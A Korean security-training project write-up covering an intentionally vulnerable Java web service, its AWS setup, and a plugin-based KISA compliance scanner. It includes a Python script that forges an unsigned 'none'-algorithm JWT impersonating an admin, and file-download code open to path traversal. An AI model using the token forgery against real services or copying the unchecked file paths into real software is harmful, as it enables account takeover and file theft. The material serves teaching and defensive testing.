# 2026-01-02 중간 점검 회의

## 참석자
- 김민곤, 나형진, 박하영, 이동훈

## 진행 상황
- [✅] 웹 서비스 기본 기능 완료 (나형진)
- [✅] KISA 플러그인 40개 완료 (박하영)
- [🔄] Streamlit 대시보드 70% 완료 (이동훈)
- [🔄] Stryker AI 연동 테스트 중 (김민곤)

## 논의 사항
1. Stryker AI 비용 문제
   - 한 번 스캔 시 약 5달러 소요
   - 테스트는 최소화하고 발표 전날 최종 1회만 실행하기로 결정

2. 플러그인 확장 방향
   - 현재 67개 완료
   - 시간이 남으면 Windows 플러그인 추가 검토

## 다음 할 일
- [ ] Streamlit 대시보드 완성 (이동훈, ~1/3)
- [ ] Stryker 결과 파싱 로직 개선 (김민곤, ~1/3)
- [ ] 웹 서비스 취약점 추가 (나형진, ~1/3)
- [ ] AWS 인프라 최종 점검 (박하영, ~1/4)
```

---

## 🌐 2.2.4 웹 서비스 구축

### 기술 스택

**발표 내용**:
> "웹 서비스에 사용한 기술 스택은 다음과 같습니다.
> **언어는 Java 언어를 사용했으며 Spring Boot와 JSP를 사용하여 서비스를 구현**했습니다.
> **서버는 Tomcat 9 환경에서 WAR 파일 기반으로 배포**를 하고 있습니다."

| 계층 | 기술 |
|:---|:---|
| **언어** | Java 11 |
| **프레임워크** | Spring Boot 2.7 |
| **뷰** | JSP (Java Server Pages) |
| **빌드 도구** | Gradle |
| **WAS** | Tomcat 9.0 |
| **배포 방식** | WAR 파일 |
| **DB** | MySQL (RDS) |

### 웹 아키텍처 (3-Tier)

**발표 내용**:
> "웹 아키텍처입니다. **표준 3-Tier 아키텍처 모델을 기반으로 구성**하여
> **Presentation, Application, Data 계층을 분리**함으로써
> **각 계층의 기능과 각 계층에서 발생하는 취약점들을 명확히 구분**하여 관리, 구현할 수 있도록 구성했습니다."


**계층별 취약점 관리**:

| 계층 | 관리하는 취약점 |
|:---|:---|
| **Presentation** | - XSS (Cross-Site Scripting)<br>- CSRF 토큰 누락<br>- 민감 정보 화면 노출 |
| **Application** | - 인증/인가 우회<br>- 비즈니스 로직 취약점<br>- JWT Non-Algorithm 공격 |
| **Data** | - SQL Injection<br>- 과도한 권한 부여<br>- 평문 데이터 저장 |

### 구현한 웹 기능

**발표 내용**:
> "구현한 웹 기능입니다. 먼저 **JWT 토큰 발급을 통한 세션 관리가 가능한 사용자 인증 기능**을 구현했습니다.
> **게시글에 CRUD가 가능한 커뮤니티 게시판**과 **파일 업로드가 가능한 파일 업로드 서비스**를 구현하였으며
> **특정 사용자만 접근 가능한 관리자 페이지**도 구성했습니다."

#### 1. 사용자 인증 (JWT 기반)

**구현 코드**:
```java
// JwtTokenProvider.java
@Component
public class JwtTokenProvider {

    @Value("${jwt.secret}")
    private String secretKey;

    @Value("${jwt.expiration}")
    private long validityInMilliseconds;

    // JWT 토큰 생성
    public String createToken(String username, String role) {
        Claims claims = Jwts.claims().setSubject(username);
        claims.put("role", role);

        Date now = new Date();
        Date validity = new Date(now.getTime() + validityInMilliseconds);

        return Jwts.builder()
                .setClaims(claims)
                .setIssuedAt(now)
                .setExpiration(validity)
                .signWith(SignatureAlgorithm.HS256, secretKey)
                .compact();
    }

    // 토큰에서 사용자 정보 추출
    public String getUsername(String token) {
        return Jwts.parser()
                .setSigningKey(secretKey)
                .parseClaimsJws(token)
                .getBody()
                .getSubject();
    }

    // 토큰 유효성 검증
    public boolean validateToken(String token) {
        try {
            Jwts.parser().setSigningKey(secretKey).parseClaimsJws(token);
            return true;
        } catch (JwtException | IllegalArgumentException e) {
            return false;
        }
    }
}
```

**로그인 컨트롤러**:
```java
// AuthController.java
@RestController
@RequestMapping("/api/auth")
public class AuthController {

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    @Autowired
    private AuthenticationManager authenticationManager;

    @PostMapping("/login")
    public ResponseEntity<LoginResponse> login(@RequestBody LoginRequest request) {
        try {
            // 인증
            Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(),
                    request.getPassword()
                )
            );

            SecurityContextHolder.getContext().setAuthentication(authentication);

            // JWT 토큰 생성
            UserDetails userDetails = (UserDetails) authentication.getPrincipal();
            String token = jwtTokenProvider.createToken(
                userDetails.getUsername(),
                userDetails.getAuthorities().iterator().next().getAuthority()
            );

            return ResponseEntity.ok(new LoginResponse(token));

        } catch (AuthenticationException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
    }
}
```

#### 2. 커뮤니티 게시판 (CRUD)

**게시글 Entity**:
```java
// Post.java
@Entity
@Table(name = "posts")
public class Post {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false)
    private String title;

    @Column(columnDefinition = "TEXT")
    private String content;

    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "user_id")
    private User author;

    @CreationTimestamp
    private LocalDateTime createdAt;

    @UpdateTimestamp
    private LocalDateTime updatedAt;

    // Getters and Setters
}
```

**게시판 컨트롤러**:
```java
// PostController.java
@Controller
@RequestMapping("/board")
public class PostController {

    @Autowired
    private PostService postService;

    // 게시글 목록 조회
    @GetMapping
    public String list(Model model, @RequestParam(defaultValue = "0") int page) {
        Page<Post> posts = postService.findAll(PageRequest.of(page, 10));
        model.addAttribute("posts", posts);
        return "board/list";
    }

    // 게시글 작성 폼
    @GetMapping("/write")
    @PreAuthorize("hasAnyRole('USER', 'ADMIN')")
    public String writeForm() {
        return "board/write";
    }

    // 게시글 작성
    @PostMapping("/write")
    @PreAuthorize("hasAnyRole('USER', 'ADMIN')")
    public String write(@ModelAttribute PostDTO postDTO, Principal principal) {
        postService.save(postDTO, principal.getName());
        return "redirect:/board";
    }

    // 게시글 상세 조회
    @GetMapping("/{id}")
    public String detail(@PathVariable Long id, Model model) {
        Post post = postService.findById(id);
        model.addAttribute("post", post);
        return "board/detail";
    }

    // 게시글 삭제
    @PostMapping("/{id}/delete")
    @PreAuthorize("hasRole('ADMIN') or @postService.isAuthor(#id, authentication.name)")
    public String delete(@PathVariable Long id) {
        postService.delete(id);
        return "redirect:/board";
    }
}
```

#### 3. 파일 업로드 서비스

**파일 업로드 컨트롤러**:
```java
// FileController.java
@Controller
@RequestMapping("/files")
public class FileController {

    @Value("${file.upload.directory}")
    private String uploadDirectory;

    @PostMapping("/upload")
    public String upload(@RequestParam("file") MultipartFile file,
                        RedirectAttributes redirectAttributes) {

        if (file.isEmpty()) {
            redirectAttributes.addFlashAttribute("error", "파일을 선택해주세요.");
            return "redirect:/files";
        }

        try {
            // 파일 저장
            String filename = StringUtils.cleanPath(file.getOriginalFilename());
            Path uploadPath = Paths.get(uploadDirectory);

            if (!Files.exists(uploadPath)) {
                Files.createDirectories(uploadPath);
            }

            Path filePath = uploadPath.resolve(filename);
            Files.copy(file.getInputStream(), filePath, StandardCopyOption.REPLACE_EXISTING);

            redirectAttributes.addFlashAttribute("message",
                "파일이 업로드되었습니다: " + filename);

        } catch (IOException e) {
            redirectAttributes.addFlashAttribute("error",
                "파일 업로드 중 오류가 발생했습니다.");
        }

        return "redirect:/files";
    }

    @GetMapping("/download/{filename}")
    public ResponseEntity<Resource> download(@PathVariable String filename) {
        try {
            Path filePath = Paths.get(uploadDirectory).resolve(filename);
            Resource resource = new UrlResource(filePath.toUri());

            if (resource.exists() || resource.isReadable()) {
                return ResponseEntity.ok()
                        .header(HttpHeaders.CONTENT_DISPOSITION,
                                "attachment; filename=\"" + resource.getFilename() + "\"")
                        .body(resource);
            } else {
                throw new RuntimeException("파일을 찾을 수 없습니다.");
            }
        } catch (MalformedURLException e) {
            throw new RuntimeException("파일 다운로드 오류", e);
        }
    }
}
```

#### 4. 관리자 페이지

**발표 내용**:
> "오른쪽의 이미지가 **루키즈의 LMS가 아니고 저희가 구현한 페이지**입니다."

**관리자 페이지 구성**:
- 사용자 관리 (목록, 권한 변경)
- 게시글 관리 (삭제, 공지사항 설정)
- 파일 관리 (업로드된 파일 목록)
- 시스템 설정

**관리자 컨트롤러**:
```java
// AdminController.java
@Controller
@RequestMapping("/admin")
@PreAuthorize("hasRole('ADMIN')")
public class AdminController {

    @Autowired
    private UserService userService;

    @Autowired
    private PostService postService;

    // 관리자 대시보드
    @GetMapping
    public String dashboard(Model model) {
        model.addAttribute("userCount", userService.count());
        model.addAttribute("postCount", postService.count());
        model.addAttribute("recentUsers", userService.findRecent(5));
        model.addAttribute("recentPosts", postService.findRecent(5));
        return "admin/dashboard";
    }

    // 사용자 관리
    @GetMapping("/users")
    public String users(Model model) {
        model.addAttribute("users", userService.findAll());
        return "admin/users";
    }

    // 사용자 권한 변경
    @PostMapping("/users/{id}/role")
    public String changeRole(@PathVariable Long id,
                            @RequestParam String role) {
        userService.changeRole(id, role);
        return "redirect:/admin/users";
    }
}
```

### 구현한 취약점 (21개)

**발표 내용**:
> "다음으로 구성한 취약점에 대해서 설명드리겠습니다.
> **KISA 가이드와 OWASP Top 10 취약점을 기반으로 총 21개의 의도적인 취약점을 구성**했으며..."

#### 취약점 분류

| 분류 | 취약점 | 개수 |
|:---|:---|:---:|
| **인증 및 계정 관리** | - 기본 계정 사용<br>- 약한 비밀번호 정책<br>- 세션 타임아웃 미설정<br>- 로그인 시도 제한 없음 | 4개 |
| **권한 및 세션 관리** | - JWT Non-Algorithm 취약점<br>- 권한 검증 미흡<br>- IDOR (Insecure Direct Object Reference)<br>- 세션 고정 공격<br>- 관리자 페이지 직접 접근 | 5개 |
| **입력 데이터 검증** | - SQL Injection<br>- SSRF (Server-Side Request Forgery)<br>- Cross-Site Scripting (XSS)<br>- Command Injection | 4개 |
| **파일 및 서버 설정** | - 악성 파일 업로드 허용<br>- 웹셸 실행 가능<br>- 시스템 파일 다운로드<br>- 디렉토리 리스팅 노출 | 4개 |
| **비즈니스 로직** | - CSRF 토큰 미사용<br>- 중복 요청 방지 미흡<br>- Race Condition<br>- 가격 조작 가능 | 4개 |

#### 주요 취약점 상세 설명

**1. JWT Non-Algorithm 취약점**

**발표 내용**:
> "권한 및 세션 관리 부분에서는 **JWT Non-Algorithm 취약점** 등 총 5개의 취약점으로 구성되어 있습니다."

**취약한 JWT 검증 코드**:
```java
// 취약한 코드
public boolean validateToken(String token) {
    try {
        // ⚠️ 알고리즘을 검증하지 않음
        Jwts.parser()
            .setSigningKey(secretKey)
            .parse(token);  // parseClaimsJws() 대신 parse() 사용
        return true;
    } catch (Exception e) {
        return false;
    }
}
```

**공격 시나리오**:
```python
# 공격자가 "none" 알고리즘으로 토큰 생성
import base64
import json

header = {
    "alg": "none",  # 알고리즘을 none으로 설정
    "typ": "JWT"
}

payload = {
    "sub": "admin",  # 관리자로 위장
    "role": "ADMIN",
    "exp": 9999999999
}

# Base64 인코딩
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# none 알고리즘이므로 서명 없음
fake_token = f"{header_encoded}.{payload_encoded}."

print(f"Fake Token: {fake_token}")
```

**안전한 코드**:
```java
// 안전한 코드
public boolean validateToken(String token) {
    try {
        // ✅ parseClaimsJws()로 서명 검증
        Claims claims = Jwts.parser()
            .setSigningKey(secretKey)
            .parseClaimsJws(token)  // 서명 필수 검증
            .getBody();

        // ✅ 알고리즘 명시적 검증
        Header header = Jwts.parser()
            .setSigningKey(secretKey)
            .parseClaimsJws(token)
            .getHeader();

        if (!"HS256".equals(header.get("alg"))) {
            throw new JwtException("Invalid algorithm");
        }

        return true;
    } catch (JwtException | IllegalArgumentException e) {
        return false;
    }
}
```

---

계속해서 7조의 AWS 인프라 구성, 진단 도구 아키텍처를 작성하겠습니다.
## ☁️ 2.2.5 AWS 인프라 구성

### 사용한 AWS 서비스

**발표 내용**:
> "다음으로 AWS 인프라 구성에 대해서 설명드리겠습니다.
> **VPC, EC2, RDS, Load Balancer** 등의 서비스를 이용하여 웹 서버와 네트워크를 구성했습니다."

| AWS 서비스 | 용도 |
|:---|:---|
| **VPC** | 가상 네트워크 구성 |
| **EC2** | 웹 서버, Bastion Host |
| **RDS** | MySQL 데이터베이스 |
| **Application Load Balancer** | HTTP/HTTPS 로드 밸런싱 |
| **Internet Gateway** | 외부 인터넷 연결 |
| **NAT Gateway** | Private Subnet 아웃바운드 |
| **Security Group** | 방화벽 규칙 |

### 전체 아키텍처

**발표 내용**:
> "전체의 아키텍처 구성은 다음과 같습니다. **하나의 VPC 내부에 Public과 Private 서브넷으로 나눠 배치**했으며
> **Route Table을 통해 각각 Internet Gateway와 NAT Gateway로 연결**되도록 구성했습니다."

```mermaid
graph TB
    Internet((Internet))

    subgraph "VPC (10.0.0.0/16)"
        subgraph "Public Subnet (10.0.1.0/24)"
            ALB[Application<br/>Load Balancer<br/>:80, :443]
            Bastion[Bastion Host<br/>:22]
            NAT[NAT Gateway]
        end

        subgraph "Private Subnet (10.0.2.0/24)"
            Web1[Web Server 1<br/>EC2<br/>:8080]
            Web2[Web Server 2<br/>EC2<br/>:8080]
            RDS[(RDS MySQL<br/>:3306)]
        end

        IGW[Internet<br/>Gateway]
        RT_Public[Route Table<br/>Public]
        RT_Private[Route Table<br/>Private]
    end

    Internet -->|HTTP/HTTPS| ALB
    Internet -->|SSH| Bastion
    ALB -->|Target Group| Web1
    ALB -->|Target Group| Web2
    Web1 -->|JDBC| RDS
    Web2 -->|JDBC| RDS

    Bastion -.->|SSH Tunnel| Web1
    Bastion -.->|SSH Tunnel| Web2

    IGW --> RT_Public
    RT_Public --> ALB
    RT_Public --> Bastion
    RT_Public --> NAT

    NAT --> RT_Private
    RT_Private --> Web1
    RT_Private --> Web2
    RT_Private --> RDS

    style ALB fill:#e1f5ff
    style Bastion fill:#ffe1e1
    style Web1 fill:#fff4e1
    style Web2 fill:#fff4e1
    style RDS fill:#e1ffe1
```



### EC2 인스턴스 구성

**발표 내용**:
> "**EC2 인스턴스는 Private 서브넷 위치한 웹 서버와 Public 서브넷 위치한 Bastion 서버**로 구성되어 있습니다."

#### 웹 서버 (Private Subnet)

```bash
# 웹 서버 스펙
Instance Type: t3.medium
vCPU: 2
RAM: 4GB
OS: Ubuntu 20.04 LTS
Storage: 20GB gp3

# 설치된 소프트웨어
- OpenJDK 11
- Tomcat 9.0
- Nginx 1.18
```

#### Bastion Host (Public Subnet)

```bash
# Bastion 스펙
Instance Type: t3.micro
vCPU: 2
RAM: 1GB
OS: Ubuntu 20.04 LTS
Storage: 8GB gp3

# 용도
- SSH 접속 경유지
- 진단 스크립트 실행 환경
- 프라이빗 서브넷 접근용
```

### Security Group 설정

**발표 내용**:
> "**Security Group을 설정**해 **Bastion 서버는 SSH 포트인 22번만 허용**하도록 구성했으며
> **웹 서버는 Bastion Security Group에서 들어오는 모든 포트와 Load Balancer Security Group에서 들어오는 8080 포트만 허용**하도록 구성했습니다."

#### ALB Security Group

```yaml
Name: alb-sg
Description: Security group for Application Load Balancer

Inbound Rules:
  - Type: HTTP
    Protocol: TCP
    Port: 80
    Source: 0.0.0.0/0 (Anywhere)

  - Type: HTTPS
    Protocol: TCP
    Port: 443
    Source: 0.0.0.0/0 (Anywhere)

Outbound Rules:
  - Type: All Traffic
    Destination: 0.0.0.0/0
```

#### Bastion Security Group

```yaml
Name: bastion-sg
Description: Security group for Bastion Host

Inbound Rules:
  - Type: SSH
    Protocol: TCP
    Port: 22
    Source: <Your IP>/32  # 특정 IP만 허용 (보안)

Outbound Rules:
  - Type: All Traffic
    Destination: 0.0.0.0/0
```

#### Web Server Security Group

```yaml
Name: web-sg
Description: Security group for Web Servers

Inbound Rules:
  - Type: Custom TCP
    Protocol: TCP
    Port: 8080
    Source: alb-sg  # ALB에서만 접근 허용

  - Type: All Traffic
    Protocol: All
    Port: All
    Source: bastion-sg  # Bastion에서 진단용 접근 허용

Outbound Rules:
  - Type: All Traffic
    Destination: 0.0.0.0/0
```

#### RDS Security Group

**발표 내용**:
> "**RDS는 Private 서브넷에 위치**하며 **Public Access를 비활성화**하여
> **웹 서버 Security Group에서 들어오는 트래픽만 허용**합니다."

```yaml
Name: rds-sg
Description: Security group for RDS MySQL

Inbound Rules:
  - Type: MySQL/Aurora
    Protocol: TCP
    Port: 3306
    Source: web-sg  # 웹 서버에서만 접근 허용

Outbound Rules:
  - Type: All Traffic
    Destination: 0.0.0.0/0
```

### Load Balancer 설정

**발표 내용**:
> "**Load Balancer는 HTTP 및 HTTPS listener를 통해 요청을 수신하고**
> **해당 요청을 웹 서버 Target Group의 8080 포트로 포워딩**하도록 구성했습니다."

```yaml
Load Balancer Type: Application Load Balancer
Scheme: Internet-facing
IP Address Type: IPv4

Listeners:
  - Protocol: HTTP
    Port: 80
    Default Action: Forward to target-group-web

  - Protocol: HTTPS
    Port: 443
    SSL Certificate: ACM Certificate
    Default Action: Forward to target-group-web

Target Group:
  Name: target-group-web
  Protocol: HTTP
  Port: 8080
  Target Type: Instance
  Health Check:
    Protocol: HTTP
    Path: /health
    Interval: 30 seconds
    Timeout: 5 seconds
    Healthy Threshold: 2
    Unhealthy Threshold: 2

Targets:
  - Instance: web-server-1 (Private Subnet)
  - Instance: web-server-2 (Private Subnet)
```

**Health Check Endpoint**:
```java
// HealthController.java
@RestController
public class HealthController {

    @GetMapping("/health")
    public ResponseEntity<String> health() {
        return ResponseEntity.ok("OK");
    }
}
```

---

## 🔧 2.2.6 진단 도구 아키텍처

### 기술 스택

**발표 내용**:
> "기술 스택입니다. **진단 도구는 Python 언어를 기반으로 구현**되었으며
> **FastAPI 프레임워크와 Pydantic을 활용해 API를 구성**하고 **Uvicorn을 ASGI 서버로 사용**했습니다."

| 계층 | 기술 |
|:---|:---|
| **언어** | Python 3.10 |
| **API 프레임워크** | FastAPI |
| **데이터 검증** | Pydantic |
| **ASGI 서버** | Uvicorn |
| **메타데이터 관리** | PyYAML |
| **SSH 연결** | Paramiko |
| **대시보드** | Streamlit |
| **DB** | SQLite (로컬) |

### 전체 아키텍처

**발표 내용**:
> "도구의 전체 아키텍처를 다이어그램으로 표현하면 다음과 같습니다.
> **Streamlit 대시보드가 사용자의 모든 요청과 결과 확인에 접점 역할**을 하며
> **FastAPI가 요청을 내부 로직으로 전달**합니다."


**아키텍처 설명**:
> "**Scan Executor가 작업의 실행 흐름을 관리**하며 **플러그인 로더에서 플러그인 YAML 메타데이터를 파싱**하여
> **다양한 진단 플러그인을 동적으로 로드**하고 진단 수행합니다."

### End-to-End 다이어그램

**발표 내용**:
> "End-to-End 다이어그램으로 표현하면 다음과 같습니다.
> **API 서버가 진단 요청을 받고 플러그인 로드를 호출**합니다.
> **플러그인 로더는 각 채널과 각 설정에 맞는 플러그인을 로드하여 진단을 수행한 후**
> **모든 진단 결과를 정규화된 Findings로 변환하여 리포트를 생성**합니다."

```
사용자
  │
  └─> Streamlit Dashboard
        │
        └─> POST /api/scan
              │
              └─> Scan Executor
                    │
                    ├─> Plugin Loader
                    │     │
                    │     ├─> Load Remote Plugins (67개)
                    │     │     │
                    │     │     └─> SSH Connection
                    │     │           │
                    │     │           └─> Execute Commands
                    │     │                 │
                    │     │                 └─> Parse Output
                    │     │                       │
                    │     │                       └─> Generate Findings
                    │     │
                    │     ├─> Load Static Plugins
                    │     │     │
                    │     │     └─> Call Stryker AI (SAST)
                    │     │           │
                    │     │           └─> Parse Stryker Report
                    │     │                 │
                    │     │                 └─> Generate Findings
                    │     │
                    │     └─> Load Dynamic Plugins
                    │           │
                    │           └─> Call Stryker AI (DAST)
                    │                 │
                    │                 └─> Parse Stryker Report
                    │                       │
                    │                       └─> Generate Findings
                    │
                    └─> Report Generator
                          │
                          └─> Aggregate All Findings
                                │
                                └─> Generate Final Report (JSON)
                                      │
                                      └─> Display in Dashboard
```

---

## 🔌 2.2.7 플러그인 확장 구조

### 플러그인 설계 철학

**발표 내용**:
> "**플러그인 확장 구조**는 다음과 같습니다. **진단 항목은 코드 변경 없이 각 채널에 맞는 플러그인 추가만으로 확장이 가능**합니다."

**설계 원칙**:
1. **코드 변경 없이 확장 가능** (Open-Closed Principle)
2. **YAML 기반 메타데이터** (선언적 설정)
3. **표준화된 인터페이스** (Base Plugin 클래스)
4. **자동 검증** (Pydantic 스키마)

### 플러그인 구조

**발표 내용**:
> "각 플러그인은 **플러그인 YAML과 메인 파이**로 이루어져 있으며
> **YAML에서는 플러그인 메타데이터와 스키마를 정의**하고
> **메인 파이에서는 check 함수가 정의된 Base Plugin이라는 클래스를 상속받아 진단 스크립트를 구현**합니다."

#### 플러그인 디렉토리 구조

```
plugins/
├── remote/                      # 원격 서버 진단
│   ├── u01_root_remote_login/
│   │   ├── plugin.yml          # 메타데이터
│   │   └── main.py             # 진단 로직
│   ├── u02_password_policy/
│   │   ├── plugin.yml
│   │   └── main.py
│   └── ... (총 67개)
│
├── static/                      # 정적 분석
│   └── stryker_sast/
│       ├── plugin.yml
│       └── main.py
│
└── dynamic/                     # 동적 분석
    └── stryker_dast/
        ├── plugin.yml
        └── main.py
```

#### 플러그인 YAML 예시

**발표 내용**:
> "이렇게 추가된 플러그인은 **플러그인 로더가 동작하여 코어의 Config Validation 모듈을 호출**하여
> **플러그인 YAML의 config 스키마 필드를 읽어서 각 플러그인의 설정값의 타입과 범위를 검증**하고
> **설정되지 않은 값은 default 값을 자동으로 주입**합니다."

```yaml
# plugins/remote/u01_root_remote_login/plugin.yml

# 메타데이터
metadata:
  id: U-01
  name: root 계정 원격 접속 제한
  description: root 계정의 원격 로그인 허용 여부를 점검합니다.
  category: 계정관리
  risk_level: 상
  channel: remote
  os: [ubuntu, centos, redhat]

# 설정 스키마
config:
  schema:
    use_sudo:
      type: boolean
      default: true
      description: sudo 권한 사용 여부

    config_path:
      type: string
      default: /etc/ssh/sshd_config
      description: sshd_config 파일 경로

  # Pydantic 검증용
  validation:
    required: []
    optional: [use_sudo, config_path]

# 진단 로직
check:
  command: "cat {{ config_path }} | grep '^PermitRootLogin'"
  expected_output: "PermitRootLogin no"
  severity_map:
    good: "PermitRootLogin no"
    bad: "PermitRootLogin yes"

# 조치 방법
solution: |
  1. sshd_config 파일 수정
     sudo vi /etc/ssh/sshd_config

  2. PermitRootLogin을 no로 변경
     PermitRootLogin no

  3. sshd 재시작
     sudo systemctl restart sshd

# 참고 자료
references:
  - name: KISA 가이드
    url: https://www.kisa.or.kr
  - name: CIS Benchmark
    url: https://www.cisecurity.org
```

#### Base Plugin 클래스

```python
# core/base_plugin.py
from abc import ABC, abstractmethod
from typing import Dict, Any, Optional
from pydantic import BaseModel, ValidationError
import yaml

class Finding(BaseModel):
    """표준화된 진단 결과"""
    plugin_id: str
    title: str
    status: str  # "양호", "취약", "검토필요"
    severity: str  # "상", "중", "하"
    category: str
    evidence: Optional[str] = None
    solution: Optional[str] = None
    references: Optional[list] = None

class BasePlugin(ABC):
    """모든 플러그인의 기본 클래스"""

    def __init__(self, plugin_dir: str):
        self.plugin_dir = plugin_dir
        self.metadata = self._load_metadata()
        self.config = self._load_config()

    def _load_metadata(self) -> Dict:
        """plugin.yml에서 메타데이터 로드"""
        with open(f"{self.plugin_dir}/plugin.yml", 'r') as f:
            data = yaml.safe_load(f)
        return data['metadata']

    def _load_config(self) -> Dict:
        """plugin.yml에서 설정 로드"""
        with open(f"{self.plugin_dir}/plugin.yml", 'r') as f:
            data = yaml.safe_load(f)
        return data.get('config', {})

    @abstractmethod
    def check(self, target: Dict, config: Dict) -> Finding:
        """
        진단 수행 (서브클래스에서 구현 필수)

        Args:
            target: 진단 대상 정보 (IP, 인증 정보 등)
            config: 사용자 설정 (플러그인별 커스텀 설정)

        Returns:
            Finding: 표준화된 진단 결과
        """
        pass

    def validate_config(self, user_config: Dict) -> Dict:
        """설정값 검증 및 기본값 주입"""
        schema = self.config.get('schema', {})
        validated = {}

        for key, definition in schema.items():
            if key in user_config:
                # 사용자 설정값 사용
                validated[key] = user_config[key]
            else:
                # 기본값 사용
                validated[key] = definition.get('default')

        return validated
```

#### 플러그인 구현 예시

```python
# plugins/remote/u01_root_remote_login/main.py
import paramiko
from core.base_plugin import BasePlugin, Finding

class U01Plugin(BasePlugin):
    """U-01: root 계정 원격 접속 제한 플러그인"""

    def check(self, target: dict, config: dict) -> Finding:
        """진단 수행"""

        # 설정 검증 및 기본값 주입
        validated_config = self.validate_config(config)

        # SSH 연결
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            # 인증
            key = paramiko.RSAKey.from_private_key_file(target['key_path'])
            ssh.connect(
                hostname=target['ip'],
                port=target['port'],
                username=target['username'],
                pkey=key
            )

            # 진단 명령어 실행
            command = f"cat {validated_config['config_path']} | grep '^PermitRootLogin'"
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8').strip()

            # 결과 판단
            if 'PermitRootLogin no' in output:
                status = '양호'
                evidence = output
            elif 'PermitRootLogin yes' in output:
                status = '취약'
                evidence = output
            else:
                status = '검토필요'
                evidence = output or '설정을 찾을 수 없습니다.'

            # Finding 생성
            return Finding(
                plugin_id=self.metadata['id'],
                title=self.metadata['name'],
                status=status,
                severity=self.metadata['risk_level'],
                category=self.metadata['category'],
                evidence=evidence,
                solution=self.metadata.get('solution'),
                references=self.metadata.get('references')
            )

        except Exception as e:
            return Finding(
                plugin_id=self.metadata['id'],
                title=self.metadata['name'],
                status='에러',
                severity=self.metadata['risk_level'],
                category=self.metadata['category'],
                evidence=f'진단 중 오류 발생: {str(e)}',
                solution=None,
                references=None
            )

        finally:
            ssh.close()
```

### Plugin Loader

```python
# core/plugin_loader.py
import os
import importlib.util
from typing import List, Dict
from core.base_plugin import BasePlugin

class PluginLoader:
    """플러그인 동적 로딩"""

    def __init__(self, plugins_dir: str = "plugins"):
        self.plugins_dir = plugins_dir

    def load_channel_plugins(self, channel: str) -> List[BasePlugin]:
        """특정 채널의 모든 플러그인 로드"""
        channel_dir = os.path.join(self.plugins_dir, channel)
        plugins = []

        if not os.path.exists(channel_dir):
            return plugins

        # 채널 디렉토리 내 모든 플러그인 탐색
        for plugin_name in os.listdir(channel_dir):
            plugin_path = os.path.join(channel_dir, plugin_name)

            if os.path.isdir(plugin_path):
                plugin = self._load_plugin(plugin_path)
                if plugin:
                    plugins.append(plugin)

        return plugins

    def _load_plugin(self, plugin_path: str) -> BasePlugin:
        """단일 플러그인 로드"""
        main_py = os.path.join(plugin_path, "main.py")

        if not os.path.exists(main_py):
            print(f"Warning: {plugin_path} has no main.py")
            return None

        try:
            # 동적 import
            spec = importlib.util.spec_from_file_location("plugin", main_py)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            # 플러그인 클래스 찾기
            for attr_name in dir(module):
                attr = getattr(module, attr_name)
                if isinstance(attr, type) and issubclass(attr, BasePlugin) and attr != BasePlugin:
                    # 플러그인 인스턴스 생성
                    return attr(plugin_path)

        except Exception as e:
            print(f"Error loading plugin {plugin_path}: {e}")
            return None

        return None

    def load_plugin_by_id(self, plugin_id: str) -> BasePlugin:
        """플러그인 ID로 특정 플러그인 로드"""
        # 모든 채널 탐색
        for channel in os.listdir(self.plugins_dir):
            channel_path = os.path.join(self.plugins_dir, channel)
            if not os.path.isdir(channel_path):
                continue

            for plugin_name in os.listdir(channel_path):
                plugin_path = os.path.join(channel_path, plugin_name)
                plugin = self._load_plugin(plugin_path)

                if plugin and plugin.metadata['id'] == plugin_id:
                    return plugin

        return None
```

### Scan Executor

**발표 내용**:
> "이후 **Scan Executor가 동작**하며 **사용자가 설정한 Scan Scope에 해당하는 플러그인의 메타데이터를 조회**하고
> **설정 검증 결과를 Scan Context에 반영하여 최종 플러그인 컨텍스트를 구성**합니다."

```python
# core/scan_executor.py
from typing import List, Dict
from core.plugin_loader import PluginLoader
from core.base_plugin import BasePlugin, Finding

class ScanExecutor:
    """스캔 실행 관리"""

    def __init__(self):
        self.loader = PluginLoader()

    def execute_scan(self,
                    target: Dict,
                    channel: str,
                    plugin_ids: List[str] = None,
                    config: Dict = None) -> List[Finding]:
        """
        스캔 실행

        Args:
            target: 진단 대상 정보
            channel: 진단 채널 (remote, static, dynamic)
            plugin_ids: 실행할 플러그인 ID 목록 (None이면 전체)
            config: 플러그인 설정

        Returns:
            List[Finding]: 진단 결과 목록
        """

        findings = []
        config = config or {}

        # 플러그인 로드
        if plugin_ids:
            # 특정 플러그인만 로드
            plugins = [self.loader.load_plugin_by_id(pid) for pid in plugin_ids]
            plugins = [p for p in plugins if p is not None]
        else:
            # 채널의 모든 플러그인 로드
            plugins = self.loader.load_channel_plugins(channel)

        # 각 플러그인 실행
        for plugin in plugins:
            print(f"[진행중] {plugin.metadata['id']} - {plugin.metadata['name']}")

            try:
                # 플러그인별 설정 추출
                plugin_config = config.get(plugin.metadata['id'], {})

                # 진단 수행
                finding = plugin.check(target, plugin_config)
                findings.append(finding)

                # 실시간 출력
                status_color = '\033[92m' if finding.status == '양호' else '\033[91m'
                print(f"{status_color}[{finding.status}]\033[0m {finding.plugin_id} - {finding.title}")

            except Exception as e:
                print(f"\033[91m[에러]\033[0m {plugin.metadata['id']} - {str(e)}")

        return findings
```

---

## 📋 2.2.8 KISA 가이드 67개 항목 구현

### 진단 방식별 분류

**발표 내용**:
> "67개의 플러그인을 모두 설명드리기에는 시간이 부족해서
> **KISA 가이드의 진단 항목들을 진단 방식별로 분류**하여 각 방식별로 하나씩만 설명드리도록 하겠습니다."

#### 진단 방식 분류

| 진단 방식 | 플러그인 수 | 설명 |
|:---|:---:|:---|
| **설정 파일 비교** | 9개 | sshd_config 등 설정 파일을 읽어 권고값과 비교 |
| **계정 정보 점검** | 9개 | /etc/passwd, /etc/shadow 등 계정 파일 분석 |
